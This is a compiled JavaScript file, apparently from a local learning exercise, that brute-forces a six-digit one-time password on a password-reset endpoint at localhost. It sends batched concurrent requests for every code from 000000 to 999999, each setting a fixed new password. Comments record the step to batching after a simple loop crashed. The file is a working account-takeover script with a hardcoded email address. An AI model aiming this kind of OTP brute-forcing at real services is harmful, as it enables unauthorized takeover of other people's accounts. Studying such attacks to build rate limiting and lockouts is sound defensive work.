"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const axios_1 = __importDefault(require("axios"));
function sendRequest(otp) {
    return __awaiter(this, void 0, void 0, function* () {
        let data = JSON.stringify({
            "email": "vikash1a@gmail.com",
            "otp": otp,
            "newPassword": "123d123"
        });
        let config = {
            method: 'post',
            maxBodyLength: Infinity,
            url: 'http://localhost:3000/reset-password',
            headers: {
                'Content-Type': 'application/json'
            },
            data: data
        };
        try {
            yield axios_1.default.request(config);
        }
        catch (e) {
            // console.log(e);
        }
        // .then((response) => {
        //     console.log(JSON.stringify(response.data));
        // })
        // .catch((error) => {
        //     console.log(error);
        // });
    });
}
// sendRequest("359043");//single request working welll to reset password 
//now lets attack
// for(let i =0;i<=999999;i++){
//     console.log(i);
//     sendRequest(i.toString());
// }
//after some counts its so slow and unfortunately crashes -->>>> needs of batching 
// ?>>>> sending bunch of req and after them sending the other next bunch of requests
function main() {
    return __awaiter(this, void 0, void 0, function* () {
        for (let i = 0; i <= 999999; i += 100) {
            const p = [];
            console.log(i);
            for (let j = 0; j < 100; j++) {
                p.push(sendRequest((i + j).toString()));
            }
            yield Promise.all(p);
        }
    });
}
main();
